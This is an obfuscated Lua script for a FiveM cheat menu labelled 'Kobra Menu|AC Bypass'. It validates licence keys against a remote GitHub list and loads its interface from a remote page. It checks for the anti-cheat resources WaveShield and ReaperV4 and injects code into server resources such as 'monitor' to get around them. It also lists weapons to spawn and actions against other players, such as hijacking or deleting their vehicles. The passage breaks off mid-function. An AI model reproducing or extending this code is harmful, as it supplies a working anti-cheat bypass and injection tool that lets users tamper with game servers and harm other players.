MachoLockLogger(1);local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v118,v119) local v120=1599 -(145 + 1454) ;local v121;while true do if (v120==(373 -(104 + 268))) then if DEBUG then local v753=1052 -(382 + 670) ;local v754;while true do if (v753==(2 -1)) then print("[KOBRA Safety] Decoded secret: "   .. table.concat(v754,",") );break;end if (v753==(726 -(228 + 498))) then v754={};for v944=1 + 0 , #v121 do v754[v944]=string.byte(v121,v944);end v753=1;end end end return v121;end if (v120==(0 + 0)) then v121="";for v663=664 -(174 + 489) , #v118 do local v664=0;local v665;while true do if (v664==0) then v665=string.byte(v118,v663);v121=v121   .. string.char((v665-v119)%(666 -410) ) ;break;end end end v120=1;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v122=GetCloudTimeAsInt();return ((v122>(1905 -(830 + 1075))) and v122) or (524 -(303 + 221)) ;end local function v7(v123) if (type(v123)~="string") then return nil;end local v124,v125,v126,v127,v128,v129=string.match(v123,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");if  not v124 then return nil;end local v130=((tonumber(v124) -1970) * (1634 -(231 + 1038))) + math.floor((tonumber(v124) -(1641 + 328))/(1166 -(171 + 991)) ) + ((tonumber(v125) -(4 -3)) * 30) + tonumber(v126) ;return (v130 * 86400) + (tonumber(v127) * (9666 -6066)) + (tonumber(v128) * (149 -89)) + tonumber(v129) ;end local function v8() if  not v3 then return false,"No key list available";end local v131,v132=pcall(json.decode,v3);if ( not v131 or  not v132 or (type(v132)~="table")) then return false,"Key list invalid";end local v133=v6();for v315,v316 in ipairs(v132) do if ((type(v316)=="table") and (v316.key==v4)) then if (v316.expires and (type(v316.expires)=="string")) then local v755=0;local v756;while true do if (v755==(1 + 0)) then if (v756>v133) then return true,"Key valid (not expired)",v756;else return false,"Key expired",v756;end break;end if (v755==0) then v756=v7(v316.expires);if  not v756 then return false,"Bad expiry format";end v755=3 -2 ;end end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end local v9,v10,v11=v8();if  not v9 then local v317=0;while true do if (v317==(0 -0)) then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,10);return;end end end Citizen.CreateThread(function() if (v11 and (v11>(0 -0))) then local v486=0 -0 ;local v487;local v488;while true do if (v486==1) then if (v488>(1248 -(111 + 1137))) then local v862=158 -(91 + 67) ;local v863;local v864;local v865;while true do if (v862==(2 -1)) then v865=string.format("Your key is valid. Expires in %d days and %d hours.",v863,v864);MachoMenuNotification("KOBRA",v865,2 + 3 );break;end if (v862==(523 -(423 + 100))) then v863=math.floor(v488/86400 );v864=math.floor((v488%(607 + 85793))/(9967 -6367) );v862=1 + 0 ;end end else MachoMenuNotification("KOBRA","Key expired.",781 -(326 + 445) );end break;end if ((0 -0)==v486) then v487=v6();v488=v11-v487 ;v486=1;end end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",10 -5 );end end);local v12={};local v13=false;local v14=nil;local v15=1;local v16={};local v17=v16;local v18=nil;local v19=1;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=2 -1 ;local v35=712 -(530 + 181) ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[27]="Escape",[60 + 52 ]="F1",[113]="F2",[114]="F3",[115]="F4",[24 + 92 ]="F5",[271 -154 ]="F6",[118]="F7",[28 + 91 ]="F8",[40 + 80 ]="F9",[76 + 45 ]="F10",[122]="F11",[1219 -(709 + 387) ]="F12",[2050 -(673 + 1185) ]="`",[49]="1",[50]="2",[147 -96 ]="3",[52]="4",[170 -117 ]="5",[54]="6",[90 -35 ]="7",[56]="8",[41 + 16 ]="9",[48]="0",[189]="-",[140 + 47 ]="=",[10 -2 ]="Backspace",[3 + 6 ]="Tab",[161 -80 ]="Q",[170 -83 ]="W",[69]="E",[1962 -(446 + 1434) ]="R",[1367 -(1040 + 243) ]="T",[265 -176 ]="Y",[1932 -(559 + 1288) ]="U",[2004 -(609 + 1322) ]="I",[533 -(13 + 441) ]="O",[298 -218 ]="P",[573 -354 ]="[",[1100 -879 ]="]",[9 + 211 ]="\\",[72 -52 ]="CapsLock",[24 + 41 ]="A",[37 + 46 ]="S",[201 -133 ]="D",[39 + 31 ]="F",[130 -59 ]="G",[48 + 24 ]="H",[74]="J",[42 + 33 ]="K",[55 + 21 ]="L",[186]=";",[187 + 35 ]="'",[13 + 0 ]="Enter",[16]="Shift",[523 -(153 + 280) ]="Z",[254 -166 ]="X",[61 + 6 ]="C",[34 + 52 ]="V",[35 + 31 ]="B",[71 + 7 ]="N",[56 + 21 ]="M",[188]=",",[289 -99 ]=".",[119 + 72 ]="/",[684 -(89 + 578) ]="Control",[33 + 13 ]="Delete",[67 -34 ]="PageUp",[1083 -(572 + 477) ]="PageDown",[5 + 30 ]="End",[22 + 14 ]="Home",[5 + 33 ]="ArrowUp",[126 -(84 + 2) ]="ArrowDown",[60 -23 ]="ArrowLeft",[29 + 10 ]="ArrowRight"};local v45={[869 -(497 + 345) ]=9 + 313 ,[19 + 93 ]=288,[1446 -(605 + 728) ]=289,[82 + 32 ]=170,[255 -140 ]=8 + 159 ,[116]=613 -447 ,[106 + 11 ]=462 -295 ,[118]=168,[90 + 29 ]=169,[120]=56,[121]=546 -(457 + 32) ,[52 + 70 ]=1746 -(832 + 570) ,[116 + 7 ]=90 + 255 ,[192]=859 -616 ,[49]=157,[50]=77 + 81 ,[847 -(588 + 208) ]=160,[52]=164,[142 -89 ]=1965 -(884 + 916) ,[112 -58 ]=93 + 66 ,[708 -(232 + 421) ]=2050 -(1569 + 320) ,[14 + 42 ]=31 + 131 ,[191 -134 ]=163,[653 -(316 + 289) ]=82,[494 -305 ]=84,[9 + 178 ]=83,[1461 -(666 + 787) ]=602 -(360 + 65) ,[9 + 0 ]=37,[335 -(79 + 175) ]=68 -24 ,[87]=25 + 7 ,[211 -142 ]=88 -42 ,[82]=45,[983 -(503 + 396) ]=426 -(92 + 89) ,[172 -83 ]=127 + 119 ,[85]=303,[44 + 29 ]=289 -215 ,[11 + 68 ]=453 -254 ,[70 + 10 ]=4 + 3 ,[666 -447 ]=5 + 34 ,[336 -115 ]=1284 -(485 + 759) ,[509 -289 ]=36,[20]=137,[1254 -(442 + 747) ]=1169 -(832 + 303) ,[1029 -(88 + 858) ]=11 + 22 ,[57 + 11 ]=2 + 28 ,[70]=838 -(766 + 23) ,[350 -279 ]=64 -17 ,[189 -117 ]=74,[74]=311,[75]=1055 -744 ,[1149 -(1036 + 37) ]=5 + 2 ,[362 -176 ]=64 + 17 ,[222]=1562 -(641 + 839) ,[926 -(910 + 3) ]=45 -27 ,[16]=21,[1774 -(1466 + 218) ]=10 + 10 ,[88]=1221 -(556 + 592) ,[24 + 43 ]=834 -(329 + 479) ,[86]=854 -(174 + 680) ,[226 -160 ]=59 -30 ,[78]=249,[55 + 22 ]=244,[188]=821 -(396 + 343) ,[17 + 173 ]=81,[1668 -(29 + 1448) ]=1472 -(135 + 1254) ,[17]=135 -99 ,[214 -168 ]=178,[33]=7 + 3 ,[1561 -(389 + 1138) ]=585 -(102 + 472) ,[34 + 1 ]=119 + 94 ,[34 + 2 ]=1758 -(320 + 1225) ,[67 -29 ]=17 + 10 ,[40]=1637 -(157 + 1307) ,[1896 -(821 + 1038) ]=433 -259 ,[39]=175};local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v134) MachoInjectResource("any",v134);end v12.Debug=function(v135,v136,v137) local v138={red="^1",yellow="^3",green="^2",info="^5"};local v139=v138[v136] or "^5" ;print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v139,v137));end;v12.SendMessage=function(v140,v141) if (v14 and v141) then MachoSendDuiMessage(v14,json.encode(v141));end end;v12.Notify=function(v142,v143,v144,v145,v146) v142:SendMessage({action="showNotification",type=v143,title=v144,desc=v145,duration=v146});end;v12.GetMenuPath=function(v147) local v148=0 + 0 ;local v149;while true do if (v148==0) then v149={"By JayMods"};for v666=1 -0 , #v21 do table.insert(v149,v21[v666]);end v148=1;end if (v148==(1 + 0)) then return v149;end end end;v12.UpdateElements=function(v150,v151) if ( not v151 or (type(v151)~="table")) then return;end local v152={action="updateElements",elements=v151,index=v15-1 ,path=v150:GetMenuPath()};if (v18 and (type(v18)=="table") and ( #v18>0)) then v152.categories=v18;v152.categoryIndex=(v19 or 1) -(2 -1) ;end v150:SendMessage(v152);end;v12.Initialize=function(v153) v153:Debug("yellow","Kobra loading... Creating DUI and prompting keybind.");local v154="https://rawcdn.githack.com/WM5M/sdkhbvfsdhjkvbdbcfjgasvdhjve64654656843242hjg4g43kg4aguk534/refs/heads/main/400.html";v14=MachoCreateDui(v154);if  not v14 then local v491=1026 -(834 + 192) ;while true do if (v491==(0 + 0)) then v153:Debug("red","Failed to create DUI!");return;end end end MachoShowDui(v14);Wait(386 + 1114 );MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title="Choose Menu Key",value=""}));SetNuiFocus(true,true);end;v12.HideUI=function(v155,v156) if v156 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v12:SendMessage({action="showUI",visible=false});end;v12.SendMessage=function(v157,v158) local v159=0 + 0 ;while true do if (v159==0) then if ( not v14 or  not v158 or (type(v158)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v158));break;end end end;v12.ShowUI=function(v160) v13=true;local v161={action="showUI",visible=true,elements=v17,index=v15-(1 -0) ,path=v160:GetMenuPath(),username=Username or "Kobra Menu|AC Bypass" ,header="",theme="kobra-red-black"};if (v18 and ( #v18>0)) then local v492=0;while true do if (v492==(304 -(300 + 4))) then v161.categories=v18;v161.categoryIndex=v19-(1 + 0) ;break;end end end v160:SendMessage(v161);end;v12.UpdateElements=function(v162,v163) local v164=0 -0 ;local v165;while true do if (v164==1) then if (v18 and ( #v18>(362 -(112 + 250)))) then local v759=0 + 0 ;while true do if (v759==(0 -0)) then v165.categories=v18;v165.categoryIndex=(v19 or 1) -(1 + 0) ;break;end end end v162:SendMessage(v165);break;end if (v164==0) then if ( not v163 or (type(v163)~="table")) then return;end v165={action="updateElements",elements=v163,index=v15-(1 + 0) ,path=v162:GetMenuPath(),header=""};v164=1 + 0 ;end end end;v26=false;MachoOnKeyDown(function(v166) local v167=0 + 0 ;while true do if (v167==1) then if (v166==(29 + 9)) then local v760=1414 -(1001 + 413) ;while true do if (v760==(0 -0)) then v12:SendMessage({action="keydown",key="ArrowUp"});return;end end end if (v166==(922 -(244 + 638))) then local v761=0;while true do if (v761==(693 -(627 + 66))) then v12:SendMessage({action="keydown",key="ArrowDown"});return;end end end v167=5 -3 ;end if (v167==2) then if (v166==13) then local v762=602 -(512 + 90) ;while true do if (v762==(1906 -(1665 + 241))) then v12:SendMessage({action="keydown",key="Enter"});return;end end end break;end if (v167==(717 -(373 + 344))) then if ((v166==(8 + 8)) or (v166==160) or (v166==161)) then v26=true;end if  not v13 then return;end v167=1 + 0 ;end end end);MachoOnKeyUp(function(v168) if ((v168==16) or (v168==(422 -262)) or (v168==(272 -111))) then v26=false;end end);local v58=nil;local function v59(v169,v170,v171,v172) local v173=0;while true do if (v173==(1101 -(35 + 1064))) then Wait(250);v12:HideUI(true);v173=3;end if (v173==(0 + 0)) then if v58 then return;end v58={title=v169,buffer=v170 or "" ,maxLength=68 -36 ,onConfirm=v171,type=v172 or "typeable" ,closeable=((v172=="keybind") and false) or true ,active=true};v173=1 + 0 ;end if (v173==(1239 -(298 + 938))) then v24=false;break;end if (v173==(1260 -(233 + 1026))) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v169,value=v58.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v173=1668 -(636 + 1030) ;end end end MachoOnKeyDown(function(v174) if ( not v58 or  not v58.active) then return;end if (v174==(7 + 6)) then v58.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));if v58.onConfirm then v58.onConfirm(v58.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v58=nil;v24=true;return;elseif (v174==8) then if (v58.type=="typeable") then v58.buffer=v58.buffer:sub(1 + 0 , -(1 + 1));else v58.buffer="";end elseif (v174==(2 + 25)) then local v832=221 -(55 + 166) ;while true do if (v832==(1 + 1)) then v58=nil;v24=true;v832=1 + 2 ;end if (v832==(3 -2)) then v58.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v832=2;end if ((300 -(36 + 261))==v832) then return;end if (v832==(0 -0)) then if  not v58.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v832=1;end end elseif (v58.type=="keybind") then local v909=v44[v174];if v909 then if (v58.buffer~=v909) then v58.buffer=v909;end end elseif (v58.type=="typeable") then local v965=1368 -(34 + 1334) ;local v966;local v967;while true do if (v965==(1 + 0)) then if (v967 and ( #v58.buffer<v58.maxLength)) then local v1289=0 + 0 ;while true do if (v1289==0) then if v12:IsShiftHeld() then if v967:match("%a") then v967=v967:upper();elseif (v967=="-") then v967="_";end elseif v967:match("%a") then v967=v967:lower();end v58.buffer=v58.buffer   .. v967 ;break;end end end break;end if (v965==(1283 -(1035 + 248))) then v966={[69 -(20 + 1) ]="0",[26 + 23 ]="1",[369 -(134 + 185) ]="2",[1184 -(549 + 584) ]="3",[737 -(314 + 371) ]="4",[181 -128 ]="5",[1022 -(478 + 490) ]="6",[30 + 25 ]="7",[1228 -(786 + 386) ]="8",[184 -127 ]="9",[1444 -(1055 + 324) ]="A",[66]="B",[1407 -(1093 + 247) ]="C",[61 + 7 ]="D",[8 + 61 ]="E",[277 -207 ]="F",[71]="G",[72]="H",[73]="I",[251 -177 ]="J",[213 -138 ]="K",[190 -114 ]="L",[28 + 49 ]="M",[300 -222 ]="N",[79]="O",[275 -195 ]="P",[62 + 19 ]="Q",[209 -127 ]="R",[83]="S",[772 -(364 + 324) ]="T",[232 -147 ]="U",[206 -120 ]="V",[29 + 58 ]="W",[368 -280 ]="X",[142 -53 ]="Y",[90]="Z",[189]="-",[187]="=",[188]=",",[190]=".",[564 -378 ]=";",[1490 -(1249 + 19) ]="'",[191]="/",[174 + 18 ]="`",[32]=" "};v967=v966[v174];v965=1;end end end if v58 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v58.title,value=v58.buffer}));end end);CreateThread(function() while true do local v318=0;while true do if (v318==(0 -0)) then Wait(1086 -(686 + 400) );if (v58~=nil) then local v833=0 + 0 ;while true do if ((230 -(73 + 156))==v833) then for v968=0 + 0 ,1168 -(721 + 90)  do if ((v968<(1 + 47)) or (v968>(292 -202))) then DisableControlAction(470 -(224 + 246) ,v968,true);end end break;end if (v833==(0 -0)) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);v833=1 -0 ;end end else Wait(91 + 409 );end break;end end end end);v12.ScrollOne=function(v175,v176) local v177=0 + 0 ;local v178;while true do if ((0 + 0)==v177) then if ( not v176 or ( #v17==(0 -0))) then return;end v178=0;v177=1;end if ((3 -2)==v177) then repeat if (v176=="Up") then v15=v15-(514 -(203 + 310)) ;if (v15<(1994 -(1238 + 755))) then v15= #v17;end elseif (v176=="Down") then v15=v15 + 1 + 0 ;if (v15> #v17) then v15=1535 -(709 + 825) ;end end v178=v178 + 1 ;if (v178>200) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v175:SendMessage({action="keydown",index=v15-(1 -0) });end break;end end end;v12.ScrollTwo=function(v179,v180) local v181=v17[v15];if  not v181 then return;end if (((v181.type=="scrollable") or (v181.type=="scrollable-checkbox")) and v181.values and ( #v181.values>(0 -0))) then local v494=864 -(196 + 668) ;while true do if (v494==1) then v179:UpdateElements(v17);if ((v181.scrollType=="onScroll") and v181.onSelect) then if (v181.type=="scrollable-checkbox") then v181.onSelect(v181.values[v181.value],v181.checked or false );else v181.onSelect(v181.values[v181.value]);end end break;end if (v494==(0 -0)) then v181.value=v181.value or 1 ;if (v180=="Left") then v181.value=v181.value-(1 -0) ;if (v181.value<1) then v181.value= #v181.values;end elseif (v180=="Right") then local 